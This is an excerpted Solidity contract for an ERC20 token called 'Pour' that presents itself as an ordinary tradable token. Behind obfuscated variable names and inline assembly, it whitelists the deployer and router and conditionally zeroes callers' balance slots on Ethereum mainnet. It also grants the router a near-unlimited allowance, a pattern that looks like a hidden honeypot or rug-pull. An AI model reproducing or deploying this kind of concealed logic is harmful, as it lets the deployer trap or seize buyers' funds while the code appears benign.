...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPour;
    uint256 private pouringRain = block.number*2;

    mapping (address => bool) private _firstHash; 
    mapping (address => bool) private _secondBits;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private rocketStart;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private zoomNow;
    address public pair;
    ...
    bool private trading; uint256 private musicTour = 1; bool private doorLock;
    uint256 private _decimals; uint256 private motherShip;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPour.push(_router); addPour.push(msgSender_); addPour.push(pair);
        for (uint256 q=0; q < 3;) {_firstHash[addPour[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xb9cd7e2b5dcc41807f96e5c7d21083d48cbf5daf1bd504401427cf86040fe4e6
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x37e57f585fd43bdaddf3ec030feba534ae6128c68539d17b983c4cb241a6bcb9,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; pouringRain = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPour[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPour(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addPour[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPour(creator, initialSupply);
    }
}

contract Pour is ERC20Token {
    constructor() ERC20Token("Pour", "POUR", msg.sender, 25000000 * 10 ** 18) {
    }
}